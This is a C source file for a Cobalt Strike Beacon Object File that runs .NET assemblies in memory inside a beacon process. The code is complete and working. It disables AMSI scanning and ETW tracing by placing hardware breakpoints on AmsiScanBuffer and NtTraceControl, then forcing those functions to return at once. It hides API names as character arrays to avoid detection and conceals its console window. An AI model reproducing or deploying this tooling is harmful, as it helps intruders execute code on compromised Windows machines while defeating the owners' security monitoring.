#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <evntprov.h>
#include <minwinbase.h>

#include "beacon.h"
#include "PatchlessinlineExecute-Assembly.h"


/*Global*/

struct descriptor_entry* head = NULL;
CRITICAL_SECTION g_critical_section = { 0 };

void set_hardware_breakpoint(const DWORD tid, const uintptr_t address, const UINT pos, const BOOL init)
{
	CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	HANDLE thd;

	char fgcti[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'T', 'h', 'r','e', 'a', 'd', 'I', 'd', 0 };
	_GetCurrentThreadId fGetCurrentThreadId = (_GetCurrentThreadId)GetProcAddress(GetModuleHandleA("kernel32.dll"), fgcti);

	if (tid == fGetCurrentThreadId())
	{
		char fgct[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'T', 'h', 'r','e', 'a', 'd', 0 };
		_GetCurrentThread GetCurrentThread = (_GetCurrentThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), fgct);
		thd = GetCurrentThread();
	}
	else
	{
		char fop[] = { 'O', 'p', 'e', 'n', 'T', 'h', 'r','e', 'a', 'd', 0 };
		_OpenThread OpenThread = (_OpenThread)GetProcAddress(GetModuleHandleA("kernel32.dll"), fop);
		thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
	}
	char fgtc[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't','e', 'x', 't', 0 };
	_GetThreadContext GetThreadContext = (_GetThreadContext)GetProcAddress(GetModuleHandleA("kernel32.dll"), fgtc);
	GetThreadContext(thd, &context);

	if (init) //enable the breakpoint
	{
		(&context.Dr0)[pos] = address;
		context.Dr7 &= ~(3ull << (16 + 4 * pos));
		context.Dr7 &= ~(3ull << (18 + 4 * pos));
		context.Dr7 |= 1ull << (2 * pos);
	}
	else
	{
		//disable the breakpoint
		if ((&context.Dr0)[pos] == address)
		{
			context.Dr7 &= ~(1ull << (2 * pos));
			(&context.Dr0)[pos] = 0ull;
		}
	}
	char fstc[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't','e', 'x', 't', 0 };
	_SetThreadContext SetThreadContext = (_SetThreadContext)GetProcAddress(GetModuleHandleA("kernel32.dll"), fstc);
	SetThreadContext(thd, &context);

	if (thd != INVALID_HANDLE_VALUE)
	{
		char fch[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
		_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), fch);
		CloseHandle(thd);
	}
}


void set_hardware_breakpoints(const uintptr_t address, const UINT pos, const BOOL init, const DWORD tid)
{
	char fgcpi[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c','e', 's', 's', 'I', 'd', 0 };
	_GetCurrentProcessId GetCurrentProcessId = (_GetCurrentProcessId)GetProcAddress(GetModuleHandleA("kernel32.dll"), fgcpi);
	const DWORD pid = GetCurrentProcessId();
	char fcths[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p','3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't', 0 };
	_CreateToolhelp32Snapshot CreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)GetProcAddress(GetModuleHandleA("kernel32.dll"), fcths);
	const HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (h != INVALID_HANDLE_VALUE) {
		THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
		char ft32f[] = { 'T', 'h', 'r', 'e', 'a', 'd', '3', '2', 'F', 'i', 'r', 's', 't', 0 };
		_Thread32First Thread32First = (_Thread32First)GetProcAddress(GetModuleHandleA("kernel32.dll"), ft32f);
		char ft32n[] = { 'T', 'h', 'r', 'e', 'a', 'd', '3', '2', 'N', 'e', 'x', 't', 0 };

		_Thread32Next Thread32Next = (_Thread32Next)GetProcAddress(GetModuleHandleA("kernel32.dll"), ft32n);

		if (Thread32First(h, &te)) {
			do {
				if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
					sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {
					if (tid != 0 && tid != te.th32ThreadID) {
						continue;
					}
					set_hardware_breakpoint(
						te.th32ThreadID,
						address,
						pos,
						init
					);

				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		char fch[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
		_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), fch);
		CloseHandle(h);
	}
}

void insert_descriptor_entry(const uintptr_t adr, const unsigned pos, const exception_callback fun, const DWORD tid)
{
	struct descriptor_entry* new = intAlloc(sizeof(struct descriptor_entry));
	const unsigned idx = pos % 4;

	KERNEL32$EnterCriticalSection(&g_critical_section);

	new->adr = adr;
	new->pos = idx;
	new->tid = tid;
	new->fun = fun;

	new->next = head;

	new->prev = NULL;

	if (head != NULL)
		head->prev = new;

	head = new;

	KERNEL32$LeaveCriticalSection(&g_critical_section);

	set_hardware_breakpoints(
		adr,
		idx,
		TRUE,
		tid
	);
}

void delete_descriptor_entry(const uintptr_t adr, const DWORD tid)
{
	struct descriptor_entry* temp;
	unsigned pos = 0;
	BOOL found = FALSE;
	KERNEL32$EnterCriticalSection(&g_critical_section);

	temp = head;

	while (temp != NULL)
	{
		if (temp->adr == adr &&
			temp->tid == tid)
		{
			found = TRUE;

			pos = temp->pos;
			if (head == temp)
				head = temp->next;

			if (temp->next != NULL)
				temp->next->prev = temp->prev;

			if (temp->prev != NULL)
				temp->prev->next = temp->next;

			FREE(temp);
		}

		temp = temp->next;
	}

	KERNEL32$LeaveCriticalSection(&g_critical_section);

	if (found)
	{
		set_hardware_breakpoints(
			adr,
			pos,
			FALSE,
			tid
		);
	}

}

LONG WINAPI exception_handler(PEXCEPTION_POINTERS ExceptionInfo)
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		struct descriptor_entry* temp;
		BOOL resolved = FALSE;

		KERNEL32$EnterCriticalSection(&g_critical_section);
		temp = head;
		while (temp != NULL)
		{
			if (temp->adr == ExceptionInfo->ContextRecord->Rip)
			{
				char fgcti[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'T', 'h', 'r', 'e','a', 'd', 'I', 'd', 0 };
				_GetCurrentThreadId fGetCurrentThreadId = (_GetCurrentThreadId)GetProcAddress(GetModuleHandleA("kernel32.dll"), fgcti);
				if (temp->tid != 0 && temp->tid != fGetCurrentThreadId())
					continue;

				temp->fun(ExceptionInfo);
				resolved = TRUE;
			}

			temp = temp->next;
		}
		KERNEL32$LeaveCriticalSection(&g_critical_section);

		if (resolved)
		{
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	return EXCEPTION_CONTINUE_SEARCH;
}


PVOID hardware_engine_init(void)
{
	char faveh[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c','e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', 0 };
	_AddVectoredExceptionHandler fAddVectoredExceptionHandler = (_AddVectoredExceptionHandler)GetProcAddress(GetModuleHandleA("kernel32.dll"), faveh);
	const PVOID handler = fAddVectoredExceptionHandler(1, exception_handler);
	KERNEL32$InitializeCriticalSection(&g_critical_section);

	return handler;
}

void hardware_engine_stop(PVOID handler)
{
	//CRITICAL_SECTION g_critical_section;
	struct descriptor_entry* temp;

	KERNEL32$EnterCriticalSection(&g_critical_section);

	temp = head;
	while (temp != NULL)
	{
		delete_descriptor_entry(temp->adr, temp->tid);
		temp = temp->next;
	}

	KERNEL32$LeaveCriticalSection(&g_critical_section);

	if (handler != NULL) KERNEL32$RemoveVectoredExceptionHandler(handler);

	KERNEL32$DeleteCriticalSection(&g_critical_section);
}


uintptr_t find_gadget(const uintptr_t function, const BYTE* stub, const UINT size, const size_t dist)
{
	for (size_t i = 0; i < dist; i++)
	{
		if (MSVCRT$memcmp((LPVOID)(function + i), stub, size) == 0) {
			return (function + i);
		}
	}
	return 0ull;
}

void rip_ret_patch(const PEXCEPTION_POINTERS ExceptionInfo)
{
	ExceptionInfo->ContextRecord->Rip = find_gadget(
		ExceptionInfo->ContextRecord->Rip,
		"\xc3", 1, 500);
	ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag
}


/*Make MailSlot*/
BOOL WINAPI MakeSlot(LPCSTR lpszSlotName, HANDLE* mailHandle)
{
	_CreateMailslotA CreateMailslotA = (_CreateMailslotA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateMailslotA");
	*mailHandle = CreateMailslotA(lpszSlotName,
		0,                             //No maximum message size 
		MAILSLOT_WAIT_FOREVER,         //No time-out for operations 
		(LPSECURITY_ATTRIBUTES)NULL);  //Default security

	if (*mailHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	else
		return TRUE;
}

/*Read Mailslot*/
BOOL ReadSlot(char* output, HANDLE* mailHandle)
{
	DWORD cbMessage = 0;
	DWORD cMessage = 0;
	DWORD cbRead = 0;
	BOOL fResult;
	LPSTR lpszBuffer = NULL;
	size_t size = 65535;
	char* achID = (char*)intAlloc(size);
	memset(achID, 0, size);
	DWORD cAllMessages = 0;
	HANDLE hEvent;
	OVERLAPPED ov;

	_CreateEventA CreateEventA = (_CreateEventA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateEventA");
	hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
	if (NULL == hEvent)
		return FALSE;
	ov.Offset = 0;
	ov.OffsetHigh = 0;
	ov.hEvent = hEvent;

		_GetMailslotInfo GetMailslotInfo = (_GetMailslotInfo)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetMailslotInfo");
	fResult = GetMailslotInfo(*mailHandle, //Mailslot handle 
		(LPDWORD)NULL,               //No maximum message size 
		&cbMessage,                  //Size of next message 
		&cMessage,                   //Number of messages 
		(LPDWORD)NULL);              //No read time-out 

	if (!fResult)
	{
		return FALSE;
	}

	if (cbMessage == MAILSLOT_NO_MESSAGE)
	{
		return TRUE;
	}

	cAllMessages = cMessage;

	while (cMessage != 0)  //Get all messages
	{
		//Allocate memory for the message. 
		lpszBuffer = (LPSTR)KERNEL32$GlobalAlloc(GPTR, KERNEL32$lstrlenA((LPSTR)achID) * sizeof(CHAR) + cbMessage);
		if (NULL == lpszBuffer)
			return FALSE;
		lpszBuffer[0] = '\0';
		_ReadFile ReadFile = (_ReadFile)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadFile");
		fResult = ReadFile(*mailHandle,
			lpszBuffer,
			cbMessage,
			&cbRead,
			&ov);

		if (!fResult)
		{
			KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
			return FALSE;
		}

		//Copy mailslot output to returnData buffer
		MSVCRT$_snprintf(output + MSVCRT$strlen(output), MSVCRT$strlen(lpszBuffer) + 1, "%s", lpszBuffer);

		fResult = GetMailslotInfo(*mailHandle,  //Mailslot handle 
			(LPDWORD)NULL,               //No maximum message size 
			&cbMessage,                  //Size of next message 
			&cMessage,                   //Number of messages 
			(LPDWORD)NULL);              //No read time-out 

		if (!fResult)
		{
			return FALSE;
		}

	}

	cbMessage = 0;
	KERNEL32$GlobalFree((HGLOBAL)lpszBuffer);
	_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
	CloseHandle(hEvent);
	return TRUE;
}

/*Determine if .NET assembly is v4 or v2*/
BOOL FindVersion(void* assembly, int length) {
	char* assembly_c;
	assembly_c = (char*)assembly;
	char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (v4[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return 1;
				}
			}
		}
	}

	return 0;
}


/*Start CLR*/
static BOOL StartCLR(LPCWSTR dotNetVersion, ICLRMetaHost** ppClrMetaHost, ICLRRuntimeInfo** ppClrRuntimeInfo, ICorRuntimeHost** ppICorRuntimeHost) {

	//Declare variables
	HRESULT hr = NULL;

	//Get the CLRMetaHost that tells us about .NET on this machine
	hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost);

	if (hr == S_OK)
	{
		//Get the runtime information for the particular version of .NET
		hr = (*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo);
		if (hr == S_OK)
		{
			/*Check if the specified runtime can be loaded into the process. This method will take into account other runtimes that may already be
			loaded into the process and set fLoadable to TRUE if this runtime can be loaded in an in-process side-by-side fashion.*/
			BOOL fLoadable;
			hr = (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable);
			if ((hr == S_OK) && fLoadable)
			{
				//Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
				hr = (*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost);
				if (hr == S_OK)
				{
					//Start it. This is okay to call even if the CLR is already running
					(*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
				}
				else
				{
					//If CLR fails to load fail gracefully
					BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
					return 0;
				}
			}
			else
			{
				//If CLR fails to load fail gracefully
				BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to load %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
				return 0;
			}
		}
		else
		{
			//If CLR fails to load fail gracefully
			BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
			return 0;
		}
	}
	else
	{
		//If CLR fails to load fail gracefully
		BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to create %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", dotNetVersion);
		return 0;
	}

	//CLR loaded successfully
	return 1;
}

/*Check Console Exists*/
static BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
	_GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
	return !!GetConsoleWindow();
}

/*BOF Entry Point*/
void go(char* args, int length) {//Executes .NET assembly in memory

	//Declare beacon parser variables
	datap  parser;
	BeaconDataParse(&parser, args, length);
	char* appDomain = NULL;
	char* assemblyArguments = NULL;
	char* pipeName = NULL;
	char* slotName = NULL;
	BOOL amsi = 0;
	BOOL etw = 0;
	BOOL mailSlot = 0;
	ULONG entryPoint = 1;
	size_t assemblyByteLen = 0;

	//Extract data sent
	appDomain = BeaconDataExtract(&parser, NULL);
	amsi = BeaconDataInt(&parser);
	etw = BeaconDataInt(&parser);
	mailSlot = BeaconDataInt(&parser);
	entryPoint = BeaconDataInt(&parser);
	slotName = BeaconDataExtract(&parser, NULL);
	pipeName = BeaconDataExtract(&parser, NULL);
	assemblyArguments = BeaconDataExtract(&parser, NULL);
	assemblyByteLen = BeaconDataInt(&parser);
	char* assemblyBytes = BeaconDataExtract(&parser, NULL);

	//Create slot and pipe names	
	SIZE_T pipeNameLen = MSVCRT$strlen(pipeName);
	char* pipePath = MSVCRT$malloc(pipeNameLen + 10);
	MSVCRT$memset(pipePath, 0, pipeNameLen + 10);
	MSVCRT$memcpy(pipePath, "\\\\.\\pipe\\", 9);
	MSVCRT$memcpy(pipePath + 9, pipeName, pipeNameLen + 1);

	SIZE_T slotNameLen = MSVCRT$strlen(slotName);
	char* slotPath = MSVCRT$malloc(slotNameLen + 14);
	MSVCRT$memset(slotPath, 0, slotNameLen + 14);
	MSVCRT$memcpy(slotPath, "\\\\.\\mailslot\\", 13);
	MSVCRT$memcpy(slotPath + 13, slotName, slotNameLen + 1);

	//Declare other variables
	HRESULT hr = NULL;
	ICLRMetaHost* pClrMetaHost = NULL;//done
	ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
	ICorRuntimeHost* pICorRuntimeHost = NULL;
	IUnknown* pAppDomainThunk = NULL;
	AppDomain* pAppDomain = NULL;
	Assembly* pAssembly = NULL;
	MethodInfo* pMethodInfo = NULL;
	VARIANT vtPsa = { 0 };
	SAFEARRAYBOUND rgsabound[1] = { 0 };
	wchar_t* wAssemblyArguments = NULL;
	wchar_t* wAppDomain = NULL;
	wchar_t* wNetVersion = NULL;
	LPWSTR* argumentsArray = NULL;
	int argumentCount = 0;
	HANDLE stdOutput;
	HANDLE stdError;
	HANDLE mainHandle;
	HANDLE hFile;
	size_t wideSize = 0;
	size_t wideSize2 = 0;
	BOOL success = 1;
	size_t size = 65535;
	char* returnData = (char*)intAlloc(size);
	memset(returnData, 0, size);

	/*
	BeaconPrintf(CALLBACK_OUTPUT, "[+] appdomain = %s\n", appDomain);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] amsi = %d\n", amsi);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] etw = %d\n", etw);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailSlot = %d\n", mailSlot);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] entryPoint = %d\n", entryPoint);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailSlot name = %s\n", slotName);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Pipe name = %s\n", pipeName);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] pipePath name = %s\n", pipePath);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] mailslot Path name = %s\n", slotPath);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyArguments = %s\n", assemblyArguments);//Debug Only
	BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyByteLen = %d\n", assemblyByteLen);//Debug Only
	*/

	//Determine .NET assemblie version
	if (FindVersion((void*)assemblyBytes, assemblyByteLen))
	{
		wNetVersion = L"v4.0.30319";
	}
	else
	{
		wNetVersion = L"v2.0.50727";
	}

	//Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
	size_t convertedChars = 0;
	wideSize = MSVCRT$strlen(assemblyArguments) + 1;
	wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
	MSVCRT$mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);

	//Convert appDomain to wide string wAppDomain to pass to CreateDomain
	size_t convertedChars2 = 0;
	wideSize2 = MSVCRT$strlen(appDomain) + 1;
	wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
	MSVCRT$mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);

	//Get an array of arguments so arugements can be passed to .NET assembly
	argumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &argumentCount);

	//Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
	vtPsa.vt = (VT_ARRAY | VT_BSTR);
	vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argumentCount);

	for (long i = 0; i < argumentCount; i++)
	{
		//Insert the string from argumentsArray[i] into the safearray
		OLEAUT32$SafeArrayPutElement(vtPsa.parray, &i, OLEAUT32$SysAllocString(argumentsArray[i]));
	}

	//Setup breakpoint
	PVOID handler = NULL;
	if (etw != 0 || amsi != 0)
	{
		handler = hardware_engine_init();
		if (handler == NULL)
		{
			BeaconPrintf(CALLBACK_ERROR, "[-] Failed to setup breakpoint! Abort.\n");
			return;
		}
	}

	_GetCurrentThreadId GetCurrentThreadId = (_GetCurrentThreadId)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetCurrentThreadId");
	//Bypass ETW
	uintptr_t etwPatchAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceControl");
	if (etw != 0) {
		insert_descriptor_entry(etwPatchAddr, 0, rip_ret_patch, GetCurrentThreadId());
	}
	
	//Start CLR
	success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);

	//If starting CLR fails exit gracefully
	if (success != 1) {
		return;
	}

	_CreateFileA CreateFileA = (_CreateFileA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateFileA");
	if (mailSlot != 0) {

		//Create Mailslot
		success = MakeSlot(slotPath, &mainHandle);

		//Get a handle to our pipe or mailslot
		hFile = CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
	}
	else {
		//Create named pipe
		_CreateNamedPipeA CreateNamedPipeA = (_CreateNamedPipeA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateNamedPipeA");
		mainHandle = CreateNamedPipeA(pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL);

		//Get a handle to our previously created named pipe
		hFile = CreateFileA(pipePath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
	}

	//Attach or create console
	BOOL frConsole = 0;
	BOOL attConsole = 0;
	attConsole = consoleExists();

	if (attConsole != 1)
	{
		frConsole = 1;
		_AllocConsole AllocConsole = (_AllocConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "AllocConsole");
		_GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
		AllocConsole();

		//Hide Console Window
		HINSTANCE hinst = LoadLibrary("user32.dll");
		_ShowWindow ShowWindow = (_ShowWindow)GetProcAddress(hinst, "ShowWindow");
		HWND wnd = GetConsoleWindow();
		if (wnd)
			ShowWindow(wnd, SW_HIDE);
	}

	//Get current stdout handle so we can revert stdout after we finish
	_GetStdHandle GetStdHandle = (_GetStdHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetStdHandle");
	stdOutput = GetStdHandle(((DWORD)-11));

	//Set stdout to our newly created named pipe or mail slot
	_SetStdHandle SetStdHandle = (_SetStdHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");
	success = SetStdHandle(((DWORD)-11), hFile);

	//Create our AppDomain
	hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
	hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);

	//Bypass amsi
	uintptr_t amsiPatchAddr = NULL;
	if (amsi != 0) {
		HINSTANCE hinst = LoadLibraryA("amsi.dll");
		amsiPatchAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("amsi.dll"), "AmsiScanBuffer");
		insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, GetCurrentThreadId());
	}
	
	

	//Prep SafeArray 
	rgsabound[0].cElements = assemblyByteLen;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, rgsabound);
	void* pvData = NULL;
	hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &pvData);

	//Copy our assembly bytes to pvData
	MSVCRT$memcpy(pvData, assemblyBytes, assemblyByteLen);

	hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);

	//Prep AppDomain and EntryPoint
	hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
	if (hr != S_OK) {
		//If AppDomain fails to load fail gracefully
		BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
		return;
	}
	hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
	if (hr != S_OK) {
		//If EntryPoint fails to load fail gracefully
		BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to find entry point of assembly.\n");
		return;
	}

	VARIANT retVal;
	ZeroMemory(&retVal, sizeof(VARIANT));
	VARIANT obj;
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	//Change cElement to the number of Main arguments
	SAFEARRAY* psaStaticMethodArgs = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, (ULONG)entryPoint);//Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

	//Insert an array of BSTR into the VT_VARIANT psaStaticMethodArgs array
	long idx[1] = { 0 };
	OLEAUT32$SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);

	//Invoke our .NET Method
	hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);

	if (mailSlot != 0) {
		//Read from our mailslot
		success = ReadSlot(returnData, &mainHandle);
	}
	else {
		//Read from named pipe
		DWORD bytesToRead = 65535;
		DWORD bytesRead = 0;
		_ReadFile ReadFile = (_ReadFile)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadFile");
		success = ReadFile(mainHandle, (LPVOID)returnData, bytesToRead, &bytesRead, NULL);
	}

	//Send .NET assembly output back to CS
	BeaconPrintf(CALLBACK_OUTPUT, "\n\n%s\n", returnData);

	//Close handles
	_CloseHandle CloseHandle = (_CloseHandle)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
	CloseHandle(mainHandle);
	CloseHandle(hFile);

	//Revert stdout back to original handles
	success = SetStdHandle(((DWORD)-11), stdOutput);

	//Clean up
	if (amsi != 0)
	{		
		delete_descriptor_entry(amsiPatchAddr, GetCurrentThreadId());
	}
	if (etw != 0)
	{
		delete_descriptor_entry(etwPatchAddr, GetCurrentThreadId());
	}

	if (etw != 0 || amsi != 0)
	{
		hardware_engine_stop(handler);
	}

	OLEAUT32$SafeArrayDestroy(pSafeArray);
	OLEAUT32$VariantClear(&retVal);
	OLEAUT32$VariantClear(&obj);
	OLEAUT32$VariantClear(&vtPsa);

	if (NULL != psaStaticMethodArgs) {
		OLEAUT32$SafeArrayDestroy(psaStaticMethodArgs);

		psaStaticMethodArgs = NULL;
	}
	if (pMethodInfo != NULL) {

		pMethodInfo->lpVtbl->Release(pMethodInfo);
		pMethodInfo = NULL;
	}
	if (pAssembly != NULL) {

		pAssembly->lpVtbl->Release(pAssembly);
		pAssembly = NULL;
	}
	if (pAppDomain != NULL) {

		pAppDomain->lpVtbl->Release(pAppDomain);
		pAppDomain = NULL;
	}
	if (pAppDomainThunk != NULL) {

		pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
	}
	if (pICorRuntimeHost != NULL)
	{
		(pICorRuntimeHost)->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
		(pICorRuntimeHost) = NULL;
	}
	if (pClrRuntimeInfo != NULL)
	{
		(pClrRuntimeInfo)->lpVtbl->Release(pClrRuntimeInfo);
		(pClrRuntimeInfo) = NULL;
	}
	if (pClrMetaHost != NULL)
	{
		(pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
		(pClrMetaHost) = NULL;
	}

	//Free console only if we attached one
	if (frConsole != 0) {
		_FreeConsole FreeConsole = (_FreeConsole)GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
		success = FreeConsole();
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] PatchlessinlineExecute-Assembly Finished\n");
}